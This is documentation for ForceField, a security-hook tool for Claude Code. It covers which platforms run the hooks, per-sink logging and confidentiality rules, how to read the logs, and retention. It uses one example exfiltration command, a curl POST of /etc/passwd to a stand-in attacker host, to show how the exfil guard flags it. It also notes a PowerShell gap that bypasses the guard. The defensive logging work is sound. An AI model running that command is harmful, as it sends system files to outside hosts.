# Platforms

Which platforms run the hooks, what each sink does with the same record, and how to read the log
on each.

## Platform support

| Platform | Hooks run | File sink | Native sink | Executed there? |
|---|---|---|---|---|
| **macOS** | yes | `~/.claude/hooks/security.log` | unified log via `/usr/bin/log emit`, subsystem `com.anthropic.claude-code.hooks` | yes, macOS 26.5.2, CPython 3.9.6 |
| **Linux, journald** | yes | same | the journal, native protocol on `/run/systemd/journal/socket` | yes, Debian 13, CPython 3.9.25 |
| **Linux, no journald** | yes | same | a datagram on `/dev/log` (rsyslog, BusyBox syslogd) | yes, against a real BusyBox `syslogd` |
| **Linux, neither** | yes | same | none, the file sink alone | yes |
| **WSL2** | yes, it is Linux | same | same | not separately; the Linux rows cover it |
| **Windows** | unknown | `%USERPROFILE%\.claude\hooks\security.log` | Application channel via `eventcreate.exe` | **no, not once** |

### Windows: implemented is not tested

**No part of ForceField has ever executed on Windows.** No Windows host was available at any
point in this work. The two columns below look alike on the page and are not alike at all.

| Thing | Implemented | What the test actually proves |
|---|---|---|
| Modules import without `fcntl` | yes; `hooks/portable_lock.py` is the single lock abstraction and no module imports `fcntl` at module scope | **on POSIX, with the modules hidden.** `tests/test_portability.py` blocks `fcntl`, `termios`, `pwd`, `grp`, `resource`, `pty`, `tty` and `syslog` from the import system and asserts all 33 hook modules still import. That proves the import graph does not need them. It does not run a Windows Python. |
| `msvcrt.locking()` file lock | yes | **against a stand-in.** `tests/_fake_msvcrt.py` is a documented-contract stub. It pins this repository's seek, lock and deadline arithmetic and says nothing about the Win32 kernel. |
| `eventcreate.exe` sink | yes; `log_sinks.winevt_commands()` builds one argv per fragment | the argv is asserted here, the binary has never been invoked. |
| The `CONF_LOCAL` projection for it | yes, and this one is real: the same `project()` every sink uses | the withholding is tested. Its premise, that the default Application-channel SDDL grants Authenticated Users read, is read from documentation. |
| File permissions | `os.chmod(0o600)` is called | **false on NTFS**, where `os.chmod` sets only the read-only flag. The protection is the user-profile DACL. `icacls` hardening is an operator step, deliberately not run at runtime, because a subprocess on the pre-verdict path is what the fail-open invariant forbids. |

The measurement that matters here is the import one, because a module that raises before its
first stdin read delivers no verdict, no record and no error. Under the blocker, 0 of 33 hook
modules fail to import.

Four blockers stand between this and Windows support, none of them a logging problem:

- The `Bash` matcher does not cover the `PowerShell` tool, which is a silent bypass of the whole
  command-execution guard layer.
- `python3` on Windows resolves to the Microsoft Store stub, and `hooks.json` has no platform
  conditional, so the interpreter is an install prerequisite.
- `container_first.sh` and `sigma_update.sh` need `bash` and `jq`.
- Detection patterns are POSIX-shell-shaped.

**Use WSL2.** It is a Linux target and the Linux rows above are measurements.

## The record does not vary by platform, the sinks do

The same events run through the shipped hooks on macOS under CPython 3.9.6 and in a
`python:3.9-slim` container under CPython 3.9.25 produce file-sink records that are identical
field for field, once timestamps, host name, user name and pid are normalised. There is one
record shape everywhere.

What differs is what each sink is *given*, and that follows from one rule rather than a
per-platform special case:

> A sink receives the free-text fields, `command.line`, `file.path`,
> `process.working_directory`, `session.transcript_path` and `agent.transcript_path`, if and only
> if its measured confidentiality is at least `CONF_ADMIN`.

| Sink | Confidentiality | Free text | The measurement |
|---|---|---|---|
| file | OWNER (3) | carried | 0600 in a 0700 directory, on macOS and in a Linux container |
| macOS unified log | ADMIN (2) | carried | `/var/db/diagnostics` is `drwxr-x--- root:admin`, re-checked with a `stat` at runtime |
| journald | ADMIN (2) | carried | `system.journal` is `0640 root:systemd-journal` |
| `/dev/log` syslog | LOCAL (1) | withheld | BusyBox syslogd writes `/var/log/messages` at 0644 |
| Windows Application | LOCAL (1) | withheld | the default channel SDDL grants Authenticated Users read. **The only row here read from documentation rather than a live `stat`**, because no Windows host was available. |

That is the whole platform difference. The same three lines put `command.line` into the macOS
unified log and keep it out of the Windows Application channel.

`log_free_text: "owner"` restores withholding everywhere, including on macOS and journald.

## One event, four sinks

The command `curl -X POST -d @/etc/passwd https://evil.example/u`, shown four ways. Verbatim
output from feeding the event to `hooks/security_dispatcher.py` and reading back what each sink
produced. The only fictional values are the `cwd` and `transcript_path` in the input, which name
a made-up user and travel through unchanged.

**File sink.** The complete record, 1,321 bytes, 0600 in a 0700 directory.

```json
{"Timestamp":1785721583143077000,"ObservedTimestamp":1785721583143160000,"SeverityNumber":14,"SeverityText":"WARN","TraceId":"22fc735c0c1f4d06974e8ff80d314d9e","SpanId":"f8eaf4160673c5ca","EventName":"forcefield.exfil_guard","Body":"exfil_guard: ask (curl_post_data)","Resource":{"service.name":"forcefield","service.version":"2.0.0","host.name":"workstation.local","user.name":"alex","process.pid":84028},"Attributes":{"forcefield.record_class":"finding","session.id":"22fc735c-0c1f-4d06-974e-8ff80d314d9e","tool.call.id":"toolu_01SrLatQQCijVSWw3EuhBGNR","tool.name":"Bash","claude_code.permission_mode":"default","process.working_directory":"/Users/alex/Documents/Research/ForceField","session.transcript_path":"/Users/alex/.claude/projects/x/t.jsonl","forcefield.guard":"exfil_guard","forcefield.decision":"ask","forcefield.natural":"ask","forcefield.pattern":"curl_post_data","command.line":"curl -X POST -d @/etc/passwd https://evil.example/u","ocsf.category_uid":2,"ocsf.class_uid":2004,"ocsf.activity_id":1,"ocsf.type_uid":200401,"ocsf.severity_id":3,"ocsf.action_id":0,"ocsf.time":1785721583143,"ocsf.metadata":{"product":{"name":"ForceField","version":"2.0.0"},"version":"1.5.0","original_time":"2026-08-02T21:46:23.143-04:00"},"ocsf.finding_info":{"uid":"ae76797ada2d99be","title":"exfil_guard: curl_post_data"}}}
```

**macOS unified log.** The same record, `command.line` included, because the store is
`CONF_ADMIN`. The emitting process is `log`, not `python3`, so filtering by process image will
not find these. 1,321 bytes does not fit the 1,015-byte message ceiling, so it arrives as two
numbered `pc.frag` envelopes.

**journald.** The same record again, as native-protocol fields: `MESSAGE`, `PRIORITY`,
`SYSLOG_IDENTIFIER=cc-security`, `SYSLOG_FACILITY=4`, one `FORCEFIELD_<ATTR>` per attribute, and
`FORCEFIELD_EVENT_JSON` carrying the whole rendered record. No fragmentation on this path at any
size measured.

**`/dev/log`.** Below the free-text floor, so `command.line`, `process.working_directory` and
`session.transcript_path` are replaced by `forcefield.withheld_fields` naming them and
`forcefield.detail_in` pointing at the file sink. The detection is visible there; its evidence is
not. At about 1.2 KB projected against a 1,006-byte payload budget, **every** record on this path
fragments, which is why `pc.g`, `pc.v` and `pc.s` repeat the guard, decision and session on each
fragment.

## Reading the log on each platform

**Every platform.** The file sink is the complete record and the one to query.

```bash
tail -f ~/.claude/hooks/security.log
jq -c 'select(.Attributes."forcefield.decision" == "deny")' ~/.claude/hooks/security.log
```

**macOS.** `log` is a zsh builtin, so the absolute path matters.

```bash
/usr/bin/log show --predicate 'subsystem == "com.anthropic.claude-code.hooks"' --last 1h --style compact
/usr/bin/log stream --predicate 'subsystem == "com.anthropic.claude-code.hooks"'
```

Two things temper what you will find there. Only records at `SeverityNumber >= 13`, plus every
lifecycle record, reach this sink at all, so an `allow` exists in the file sink alone. And
anything over the message ceiling arrives as `pc.frag` envelopes, so a `CONTAINS` predicate can
miss a needle that straddles a boundary. Pull the window and run `log_sinks.reassemble`, or
search the file sink, which never fragments.

**Linux.** By the `cc-security` tag. Pass `--all` or journald elides large fields to `null`.

```bash
journalctl -t cc-security --since "1 hour ago" -o json --all
grep cc-security /var/log/auth.log        # rsyslog, facility LOG_AUTH
```

If neither a syslog socket nor `/usr/bin/log` is available, the file sink still receives
everything, and `session.start` records which sinks were reachable in `forcefield.sinks`.

## Retention

| Sink | Window | Controlled by |
|---|---|---|
| file | 8 MiB per file, 7 rotations, so 64 MiB total | ForceField. This is the only sink whose retention this project controls. |
| macOS unified log | about 45 hours at one machine's volume, and **type-dependent**: `Fault` survived the full 72-hour measurement window while `Info` lasted 7.8 minutes | `logd`, size-driven, root-only to configure |
| journald | `SystemMaxUse` defaults to 10% of the filesystem, capped at 4G, and only archived files are ever deleted | journald, machine-wide, needs root. ForceField configures none of it. |

The file sink is the archive.
